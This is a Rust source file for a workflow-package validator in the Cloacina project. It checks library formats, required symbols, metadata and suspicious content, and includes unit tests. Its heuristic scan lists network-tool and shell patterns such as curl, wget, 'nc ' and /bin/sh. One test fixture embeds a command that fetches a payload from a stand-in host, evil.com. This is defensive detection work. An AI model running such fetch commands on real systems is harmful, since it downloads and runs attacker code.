/*
 *  Copyright 2025 Colliery Software
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */

//! Package validator for ensuring workflow package safety and compatibility.
//!
//! This module provides comprehensive validation of workflow packages before
//! they are registered and loaded, including security checks, symbol validation,
//! metadata verification, and compatibility testing.

use libloading::Library;
use std::collections::HashSet;
use std::path::Path;
use tempfile::TempDir;
use tokio::fs;

use crate::registry::error::LoaderError;
use crate::registry::loader::package_loader::{
    get_library_extension, PackageMetadata, EXECUTE_TASK_SYMBOL, GET_METADATA_SYMBOL,
};

/// Package validation results
#[derive(Debug, Clone)]
pub struct ValidationResult {
    /// Whether the package passed all validations
    pub is_valid: bool,
    /// List of validation errors (if any)
    pub errors: Vec<String>,
    /// List of validation warnings (non-fatal issues)
    pub warnings: Vec<String>,
    /// Security assessment
    pub security_level: SecurityLevel,
    /// Compatibility assessment
    pub compatibility: CompatibilityInfo,
}

/// Security assessment levels for packages
#[derive(Debug, Clone, PartialEq)]
pub enum SecurityLevel {
    /// Package appears safe for production use
    Safe,
    /// Package has minor security concerns but is likely safe
    Warning,
    /// Package has significant security risks
    Dangerous,
    /// Package cannot be assessed (insufficient information)
    Unknown,
}

/// Compatibility information for packages
#[derive(Debug, Clone)]
pub struct CompatibilityInfo {
    /// Target architecture of the package
    pub architecture: String,
    /// Required symbols present
    pub required_symbols: Vec<String>,
    /// Missing required symbols
    pub missing_symbols: Vec<String>,
    /// cloacina version compatibility (if detectable)
    pub cloacina_version: Option<String>,
}

/// Comprehensive package validator
pub struct PackageValidator {
    /// Temporary directory for validation operations
    temp_dir: TempDir,
    /// Strict validation mode (fails on warnings)
    strict_mode: bool,
    /// Maximum allowed package size in bytes
    max_package_size: u64,
    /// Required symbols for cloacina packages
    required_symbols: HashSet<String>,
}

impl PackageValidator {
    /// Create a new package validator with default settings.
    pub fn new() -> Result<Self, LoaderError> {
        let temp_dir = TempDir::new().map_err(|e| LoaderError::TempDirectory {
            error: e.to_string(),
        })?;

        let mut required_symbols = HashSet::new();
        required_symbols.insert(EXECUTE_TASK_SYMBOL.to_string());
        required_symbols.insert(GET_METADATA_SYMBOL.to_string());

        Ok(Self {
            temp_dir,
            strict_mode: false,
            max_package_size: 100 * 1024 * 1024, // 100MB default limit
            required_symbols,
        })
    }

    /// Create a validator with strict validation mode enabled.
    pub fn strict() -> Result<Self, LoaderError> {
        let mut validator = Self::new()?;
        validator.strict_mode = true;
        Ok(validator)
    }

    /// Set the maximum allowed package size.
    pub fn with_max_size(mut self, max_bytes: u64) -> Self {
        self.max_package_size = max_bytes;
        self
    }

    /// Add additional required symbols for validation.
    pub fn with_required_symbols<I, S>(mut self, symbols: I) -> Self
    where
        I: IntoIterator<Item = S>,
        S: Into<String>,
    {
        for symbol in symbols {
            self.required_symbols.insert(symbol.into());
        }
        self
    }

    /// Validate a package comprehensively.
    ///
    /// # Arguments
    ///
    /// * `package_data` - Binary data of the library package
    /// * `metadata` - Package metadata (if available)
    ///
    /// # Returns
    ///
    /// * `Ok(ValidationResult)` - Validation completed (check is_valid field)
    /// * `Err(LoaderError)` - Validation process failed
    pub async fn validate_package(
        &self,
        package_data: &[u8],
        metadata: Option<&PackageMetadata>,
    ) -> Result<ValidationResult, LoaderError> {
        let mut result = ValidationResult {
            is_valid: true,
            errors: Vec::new(),
            warnings: Vec::new(),
            security_level: SecurityLevel::Safe,
            compatibility: CompatibilityInfo {
                architecture: "unknown".to_string(),
                required_symbols: Vec::new(),
                missing_symbols: Vec::new(),
                cloacina_version: None,
            },
        };

        // Basic size validation
        self.validate_package_size(package_data, &mut result);

        // Write package to temporary file for analysis with correct extension
        let library_extension = get_library_extension();
        let temp_path = self
            .temp_dir
            .path()
            .join(format!("validation_package.{}", library_extension));
        fs::write(&temp_path, package_data)
            .await
            .map_err(|e| LoaderError::FileSystem {
                path: temp_path.to_string_lossy().to_string(),
                error: e.to_string(),
            })?;

        // File format validation
        self.validate_file_format(&temp_path, &mut result).await;

        // Symbol validation
        self.validate_symbols(&temp_path, &mut result).await;

        // Metadata validation
        if let Some(metadata) = metadata {
            self.validate_metadata(metadata, &mut result);
        }

        // Security assessment
        self.assess_security(&temp_path, &mut result).await;

        // Final validation decision
        if !result.errors.is_empty() || (self.strict_mode && !result.warnings.is_empty()) {
            result.is_valid = false;
        }

        Ok(result)
    }

    /// Validate package size constraints.
    fn validate_package_size(&self, package_data: &[u8], result: &mut ValidationResult) {
        let size = package_data.len() as u64;

        if size == 0 {
            result.errors.push("Package is empty".to_string());
        } else if size > self.max_package_size {
            result.errors.push(format!(
                "Package size {} bytes exceeds maximum allowed size {} bytes",
                size, self.max_package_size
            ));
        } else if size < 1024 {
            result
                .warnings
                .push("Package is unusually small (< 1KB)".to_string());
        } else if size > 50 * 1024 * 1024 {
            result
                .warnings
                .push("Package is quite large (> 50MB)".to_string());
        }
    }

    /// Validate file format and basic structure.
    async fn validate_file_format(&self, package_path: &Path, result: &mut ValidationResult) {
        // Check for supported dynamic library formats
        match fs::read(package_path).await {
            Ok(data) if data.len() >= 4 => {
                let is_valid_format = if &data[0..4] == b"\x7fELF" {
                    // ELF format (Linux)
                    if data.len() >= 5 {
                        match data[4] {
                            1 => result.compatibility.architecture = "32-bit".to_string(),
                            2 => result.compatibility.architecture = "64-bit".to_string(),
                            _ => result.warnings.push("Unknown ELF class".to_string()),
                        }
                    }
                    true
                } else if data.len() >= 4 && &data[0..4] == b"\xcf\xfa\xed\xfe" {
                    // Mach-O 64-bit format (macOS)
                    result.compatibility.architecture = "64-bit".to_string();
                    true
                } else if data.len() >= 4 && &data[0..4] == b"\xce\xfa\xed\xfe" {
                    // Mach-O 32-bit format (macOS)
                    result.compatibility.architecture = "32-bit".to_string();
                    true
                } else if data.len() >= 2 && &data[0..2] == b"MZ" {
                    // PE format (Windows)
                    result.compatibility.architecture = "Windows".to_string();
                    true
                } else {
                    false
                };

                if !is_valid_format {
                    result.errors.push(
                        "Package is not a valid dynamic library (not ELF, Mach-O, or PE format)"
                            .to_string(),
                    );
                }
            }
            Ok(_) => result
                .errors
                .push("Package file is too small to be a valid dynamic library".to_string()),
            Err(e) => result
                .errors
                .push(format!("Failed to read package file: {}", e)),
        }

        // Try to load as dynamic library
        match unsafe { Library::new(package_path) } {
            Ok(_) => {
                // Library loads successfully
            }
            Err(e) => {
                result.errors.push(format!(
                    "Package cannot be loaded as dynamic library: {}",
                    e
                ));
            }
        }
    }

    /// Validate required symbols are present.
    async fn validate_symbols(&self, package_path: &Path, result: &mut ValidationResult) {
        match unsafe { Library::new(package_path) } {
            Ok(lib) => {
                for symbol in &self.required_symbols {
                    match unsafe { lib.get::<unsafe extern "C" fn()>(symbol.as_bytes()) } {
                        Ok(_) => {
                            result.compatibility.required_symbols.push(symbol.clone());
                        }
                        Err(_) => {
                            result.compatibility.missing_symbols.push(symbol.clone());
                            result
                                .errors
                                .push(format!("Required symbol '{}' not found", symbol));
                        }
                    }
                }

                // Check for common optional symbols
                let optional_symbols = [
                    "cloacina_get_version",
                    "cloacina_get_author",
                    "cloacina_get_description",
                ];

                for symbol in &optional_symbols {
                    if unsafe { lib.get::<unsafe extern "C" fn()>(symbol.as_bytes()).is_ok() } {
                        result
                            .compatibility
                            .required_symbols
                            .push(symbol.to_string());
                    }
                }
            }
            Err(e) => {
                result
                    .errors
                    .push(format!("Cannot load library for symbol validation: {}", e));
            }
        }
    }

    /// Validate package metadata for consistency and safety.
    fn validate_metadata(&self, metadata: &PackageMetadata, result: &mut ValidationResult) {
        // Package name validation
        if metadata.package_name.is_empty() {
            result
                .errors
                .push("Package name cannot be empty".to_string());
        } else if !metadata
            .package_name
            .chars()
            .all(|c| c.is_alphanumeric() || c == '_' || c == '-')
        {
            result
                .warnings
                .push("Package name contains non-standard characters".to_string());
        }

        // Version validation
        if metadata.version.is_empty() {
            result.warnings.push("Package version is empty".to_string());
        }

        // Task validation
        if metadata.tasks.is_empty() {
            result
                .warnings
                .push("Package contains no tasks".to_string());
        } else {
            let mut task_ids = HashSet::new();
            for task in &metadata.tasks {
                // Check for duplicate task IDs
                if !task_ids.insert(&task.local_id) {
                    result
                        .errors
                        .push(format!("Duplicate task ID: {}", task.local_id));
                }

                // Validate task ID format
                if task.local_id.is_empty() {
                    result.errors.push("Task has empty ID".to_string());
                } else if !task
                    .local_id
                    .chars()
                    .all(|c| c.is_alphanumeric() || c == '_')
                {
                    result.warnings.push(format!(
                        "Task ID '{}' contains non-standard characters",
                        task.local_id
                    ));
                }
            }
        }

        // Architecture compatibility
        let current_arch = std::env::consts::ARCH;
        if !metadata.architecture.is_empty() && metadata.architecture != current_arch {
            result.warnings.push(format!(
                "Package architecture '{}' may not be compatible with current architecture '{}'",
                metadata.architecture, current_arch
            ));
        }
    }

    /// Perform security assessment of the package.
    async fn assess_security(&self, package_path: &Path, result: &mut ValidationResult) {
        let mut security_issues = 0;

        // Check file permissions
        match fs::metadata(package_path).await {
            Ok(metadata) => {
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    let mode = metadata.permissions().mode();

                    // Check if file is world-writable
                    if mode & 0o002 != 0 {
                        result
                            .warnings
                            .push("Package file is world-writable".to_string());
                        security_issues += 1;
                    }

                    // Check if file is executable
                    if mode & 0o111 == 0 {
                        result
                            .warnings
                            .push("Package file is not executable".to_string());
                    }
                }
            }
            Err(e) => {
                result
                    .warnings
                    .push(format!("Cannot check file permissions: {}", e));
            }
        }

        // Basic heuristic checks for suspicious patterns
        match fs::read(package_path).await {
            Ok(data) => {
                // Check for suspicious strings (basic detection)
                let suspicious_patterns: [&[u8]; 6] =
                    [b"/bin/sh", b"system(", b"exec", b"curl", b"wget", b"nc "];

                for pattern in &suspicious_patterns {
                    if data.windows(pattern.len()).any(|window| window == *pattern) {
                        result.warnings.push(format!(
                            "Package contains potentially suspicious pattern: {}",
                            String::from_utf8_lossy(pattern)
                        ));
                        security_issues += 1;
                    }
                }
            }
            Err(e) => {
                result
                    .warnings
                    .push(format!("Cannot read package for security analysis: {}", e));
            }
        }

        // Determine security level
        result.security_level = if security_issues == 0 {
            SecurityLevel::Safe
        } else if security_issues <= 2 {
            SecurityLevel::Warning
        } else {
            SecurityLevel::Dangerous
        };
    }

    /// Get the temporary directory path.
    pub fn temp_dir(&self) -> &Path {
        self.temp_dir.path()
    }

    /// Check if strict mode is enabled.
    pub fn is_strict_mode(&self) -> bool {
        self.strict_mode
    }

    /// Get the maximum package size limit.
    pub fn max_package_size(&self) -> u64 {
        self.max_package_size
    }
}

impl Default for PackageValidator {
    fn default() -> Self {
        Self::new().expect("Failed to create default PackageValidator")
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::registry::loader::package_loader::{PackageMetadata, TaskMetadata};

    /// Helper to create a valid ELF header for testing
    fn create_valid_elf_header() -> Vec<u8> {
        let mut data = Vec::with_capacity(1024);

        // ELF magic number
        data.extend_from_slice(b"\x7fELF");

        // ELF header fields
        data.extend_from_slice(&[
            0x02, // 64-bit
            0x01, // Little endian
            0x01, // Current version
            0x00, // System V ABI
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Padding
            0x03, 0x00, // Shared object file type
            0x3e, 0x00, // x86-64 architecture
        ]);

        // Pad to minimum ELF header size (64 bytes)
        while data.len() < 64 {
            data.push(0x00);
        }

        // Add some fake code sections
        for i in 0..(1024 - 64) {
            data.push((i % 256) as u8);
        }

        data
    }

    /// Helper to create invalid binary data
    fn create_invalid_binary() -> Vec<u8> {
        b"This is definitely not a valid dynamic library".to_vec()
    }

    /// Helper to create binary with suspicious content
    fn create_suspicious_binary() -> Vec<u8> {
        let mut data = create_valid_elf_header();

        // Add suspicious patterns
        data.extend_from_slice(b"/bin/sh -c 'curl http://evil.com/payload'");
        data.extend_from_slice(b"system(malicious_command)");

        data
    }

    /// Helper to create mock package metadata
    fn create_mock_metadata(package_name: &str, task_count: usize) -> PackageMetadata {
        let tasks: Vec<TaskMetadata> = (0..task_count)
            .map(|i| TaskMetadata {
                index: i as u32,
                local_id: format!("task_{}", i),
                namespaced_id_template: format!(
                    "{{tenant_id}}/{{package_name}}/{}",
                    format!("task_{}", i)
                ),
                dependencies: Vec::new(),
                description: format!("Test task {}", i),
                source_location: "test.rs:1".to_string(),
            })
            .collect();

        PackageMetadata {
            package_name: package_name.to_string(),
            version: "1.0.0".to_string(),
            description: Some("Test package".to_string()),
            author: Some("Test Author".to_string()),
            tasks,
            graph_data: None,
            architecture: "x86_64".to_string(),
            symbols: vec![
                "cloacina_execute_task".to_string(),
                "cloacina_get_task_metadata".to_string(),
            ],
        }
    }

    #[tokio::test]
    async fn test_validator_creation() {
        let validator = PackageValidator::new().expect("Failed to create validator");

        assert!(!validator.is_strict_mode());
        assert_eq!(validator.max_package_size(), 100 * 1024 * 1024);
        assert!(validator.temp_dir().exists());
    }

    #[tokio::test]
    async fn test_validator_default() {
        let validator = PackageValidator::default();
        assert!(!validator.is_strict_mode());
        assert!(validator.temp_dir().exists());
    }

    #[tokio::test]
    async fn test_strict_validator() {
        let validator = PackageValidator::strict().expect("Failed to create strict validator");
        assert!(validator.is_strict_mode());
    }

    #[tokio::test]
    async fn test_validator_with_custom_max_size() {
        let validator = PackageValidator::new().unwrap().with_max_size(1024);

        assert_eq!(validator.max_package_size(), 1024);
    }

    #[tokio::test]
    async fn test_validator_with_required_symbols() {
        let validator = PackageValidator::new()
            .unwrap()
            .with_required_symbols(vec!["custom_symbol_1", "custom_symbol_2"]);

        // Validator should accept additional required symbols
        assert!(validator.temp_dir().exists());
    }

    #[tokio::test]
    async fn test_validate_empty_package() {
        let validator = PackageValidator::new().unwrap();
        let empty_data = Vec::new();

        let result = validator.validate_package(&empty_data, None).await.unwrap();

        assert!(!result.is_valid);
        assert!(result.errors.iter().any(|e| e.contains("empty")));
        assert_eq!(result.security_level, SecurityLevel::Safe); // Empty is safe but invalid
    }

    #[tokio::test]
    async fn test_validate_oversized_package() {
        let validator = PackageValidator::new().unwrap().with_max_size(100);

        let large_data = vec![0x00; 200]; // Larger than limit

        let result = validator.validate_package(&large_data, None).await.unwrap();

        assert!(!result.is_valid);
        assert!(result.errors.iter().any(|e| e.contains("exceeds maximum")));
    }

    #[tokio::test]
    async fn test_validate_invalid_elf() {
        let validator = PackageValidator::new().unwrap();
        let invalid_data = create_invalid_binary();

        let result = validator
            .validate_package(&invalid_data, None)
            .await
            .unwrap();

        assert!(!result.is_valid);
        assert!(result
            .errors
            .iter()
            .any(|e| e.contains("valid dynamic library")));
    }

    #[tokio::test]
    async fn test_validate_valid_elf_header() {
        let validator = PackageValidator::new().unwrap();
        let valid_data = create_valid_elf_header();

        let result = validator.validate_package(&valid_data, None).await.unwrap();

        // Should have ELF validation pass but fail on missing symbols
        assert!(!result.is_valid); // Will fail due to missing required symbols
        assert!(result
            .errors
            .iter()
            .any(|e| e.contains("Symbol") || e.contains("dynamic library")));
        assert_eq!(result.compatibility.architecture, "64-bit");
    }

    #[tokio::test]
    async fn test_validate_suspicious_content() {
        let validator = PackageValidator::new().unwrap();
        let suspicious_data = create_suspicious_binary();

        let result = validator
            .validate_package(&suspicious_data, None)
            .await
            .unwrap();

        assert!(!result.is_valid); // Will fail due to missing symbols, but also check security
        assert!(result.warnings.len() > 0); // Should have security warnings
        assert!(matches!(
            result.security_level,
            SecurityLevel::Warning | SecurityLevel::Dangerous
        ));
    }

    #[tokio::test]
    async fn test_validate_with_metadata() {
        let validator = PackageValidator::new().unwrap();
        let valid_data = create_valid_elf_header();
        let metadata = create_mock_metadata("test_package", 2);

        let result = validator
            .validate_package(&valid_data, Some(&metadata))
            .await
            .unwrap();

        // Should validate metadata fields
        assert!(!result.is_valid); // Will still fail due to missing symbols

        // But should have processed metadata without metadata-specific errors
        let metadata_errors: Vec<_> = result
            .errors
            .iter()
            .filter(|e| e.contains("Package name") || e.contains("empty ID"))
            .collect();
        assert_eq!(metadata_errors.len(), 0); // No metadata validation errors
    }

    #[tokio::test]
    async fn test_validate_metadata_with_invalid_package_name() {
        let validator = PackageValidator::new().unwrap();
        let valid_data = create_valid_elf_header();
        let mut metadata = create_mock_metadata("", 1); // Empty name
        metadata.package_name = "".to_string();

        let result = validator
            .validate_package(&valid_data, Some(&metadata))
            .await
            .unwrap();

        assert!(!result.is_valid);
        assert!(result
            .errors
            .iter()
            .any(|e| e.contains("Package name cannot be empty")));
    }

    #[tokio::test]
    async fn test_validate_metadata_with_special_characters() {
        let validator = PackageValidator::new().unwrap();
        let valid_data = create_valid_elf_header();
        let metadata = create_mock_metadata("package@#$%^", 1);

        let result = validator
            .validate_package(&valid_data, Some(&metadata))
            .await
            .unwrap();

        // Should have warning about non-standard characters
        assert!(result
            .warnings
            .iter()
            .any(|w| w.contains("non-standard characters")));
    }

    #[tokio::test]
    async fn test_validate_metadata_with_duplicate_task_ids() {
        let validator = PackageValidator::new().unwrap();
        let valid_data = create_valid_elf_header();

        let mut metadata = create_mock_metadata("test", 2);
        // Make both tasks have the same ID
        metadata.tasks[1].local_id = metadata.tasks[0].local_id.clone();

        let result = validator
            .validate_package(&valid_data, Some(&metadata))
            .await
            .unwrap();

        assert!(!result.is_valid);
        assert!(result
            .errors
            .iter()
            .any(|e| e.contains("Duplicate task ID")));
    }

    #[tokio::test]
    async fn test_validate_metadata_with_no_tasks() {
        let validator = PackageValidator::new().unwrap();
        let valid_data = create_valid_elf_header();
        let metadata = create_mock_metadata("empty_package", 0);

        let result = validator
            .validate_package(&valid_data, Some(&metadata))
            .await
            .unwrap();

        // Should have warning about no tasks
        assert!(result
            .warnings
            .iter()
            .any(|w| w.contains("contains no tasks")));
    }

    #[tokio::test]
    async fn test_strict_mode_validation() {
        let validator = PackageValidator::strict().unwrap();
        let valid_data = create_valid_elf_header();
        let metadata = create_mock_metadata("test_package", 1);

        let result = validator
            .validate_package(&valid_data, Some(&metadata))
            .await
            .unwrap();

        // In strict mode, warnings should cause validation to fail
        assert!(!result.is_valid);
    }

    #[tokio::test]
    async fn test_permissive_mode_with_warnings() {
        let validator = PackageValidator::new().unwrap(); // Non-strict
        let mut data = create_valid_elf_header();

        // Make it small enough to generate a warning but not an error
        data.truncate(500); // Small but not empty

        let result = validator.validate_package(&data, None).await.unwrap();

        // Should have warnings but might still be considered valid in permissive mode
        // (though will fail due to symbol issues)
        assert!(result.warnings.len() > 0 || result.errors.len() > 0);
    }

    #[tokio::test]
    async fn test_security_assessment_levels() {
        let validator = PackageValidator::new().unwrap();

        // Test safe package
        let safe_data = create_valid_elf_header();
        let safe_result = validator.validate_package(&safe_data, None).await.unwrap();
        assert!(matches!(safe_result.security_level, SecurityLevel::Safe));

        // Test suspicious package
        let suspicious_data = create_suspicious_binary();
        let suspicious_result = validator
            .validate_package(&suspicious_data, None)
            .await
            .unwrap();
        assert!(matches!(
            suspicious_result.security_level,
            SecurityLevel::Warning | SecurityLevel::Dangerous
        ));
    }

    #[tokio::test]
    async fn test_compatibility_info() {
        let validator = PackageValidator::new().unwrap();
        let valid_data = create_valid_elf_header();

        let result = validator.validate_package(&valid_data, None).await.unwrap();

        // Should have extracted compatibility information
        assert_eq!(result.compatibility.architecture, "64-bit");
        // Mock ELF data can't be loaded as a library, so symbol validation fails
        // This means missing_symbols won't be populated, but there should be errors about library loading
        assert!(result
            .errors
            .iter()
            .any(|e| e.contains("dynamic library") || e.contains("symbol validation")));
    }

    #[tokio::test]
    async fn test_concurrent_validation() {
        use std::sync::Arc;
        use tokio::task;

        let validator = Arc::new(PackageValidator::new().unwrap());
        let mut handles = Vec::new();

        // Start multiple concurrent validations
        for i in 0..5 {
            let validator_clone = Arc::clone(&validator);
            let handle = task::spawn(async move {
                let mut test_data = create_valid_elf_header();
                test_data.push(i); // Make each test unique

                let result = validator_clone.validate_package(&test_data, None).await;
                assert!(result.is_ok());

                i
            });
            handles.push(handle);
        }

        // Wait for all validations to complete
        for handle in handles {
            let task_id = handle.await.expect("Task should complete");
            assert!(task_id < 5);
        }
    }

    #[tokio::test]
    async fn test_memory_safety_with_large_packages() {
        let validator = PackageValidator::new()
            .unwrap()
            .with_max_size(10 * 1024 * 1024); // 10MB limit

        // Test with 1MB package (under limit)
        let large_data = vec![0x7f; 1024 * 1024];
        let result = validator.validate_package(&large_data, None).await.unwrap();

        // Should handle large packages without memory issues
        // Large data with 0x7f bytes doesn't create a valid ELF file, so should get format error
        assert!(result
            .errors
            .iter()
            .any(|e| e.contains("valid dynamic library") || e.contains("dynamic library")));
    }

    #[tokio::test]
    async fn test_temp_directory_isolation() {
        let validator1 = PackageValidator::new().unwrap();
        let validator2 = PackageValidator::new().unwrap();

        // Each validator should have its own temp directory
        assert_ne!(validator1.temp_dir(), validator2.temp_dir());
        assert!(validator1.temp_dir().exists());
        assert!(validator2.temp_dir().exists());
    }

    #[tokio::test]
    async fn test_validation_result_serialization() {
        let validator = PackageValidator::new().unwrap();
        let test_data = create_valid_elf_header();

        let result = validator.validate_package(&test_data, None).await.unwrap();

        // ValidationResult should have proper Debug implementation
        let debug_string = format!("{:?}", result);
        assert!(!debug_string.is_empty());
        assert!(debug_string.contains("ValidationResult"));
    }

    #[tokio::test]
    async fn test_error_message_quality() {
        let validator = PackageValidator::new().unwrap();
        let invalid_data = b"totally invalid data".to_vec();

        let result = validator
            .validate_package(&invalid_data, None)
            .await
            .unwrap();

        assert!(!result.is_valid);
        assert!(!result.errors.is_empty());

        // Error messages should be informative
        for error in &result.errors {
            assert!(!error.is_empty());
            assert!(error.len() > 10); // Should be descriptive
        }
    }

    #[test]
    fn test_security_level_equality() {
        assert_eq!(SecurityLevel::Safe, SecurityLevel::Safe);
        assert_ne!(SecurityLevel::Safe, SecurityLevel::Warning);
        assert_ne!(SecurityLevel::Warning, SecurityLevel::Dangerous);
        assert_ne!(SecurityLevel::Dangerous, SecurityLevel::Unknown);
    }

    #[test]
    fn test_validator_sync_creation() {
        // Test that we can create a validator in non-async context
        let result = PackageValidator::new();
        assert!(result.is_ok());

        let validator = result.unwrap();
        assert!(validator.temp_dir().exists());
    }
}
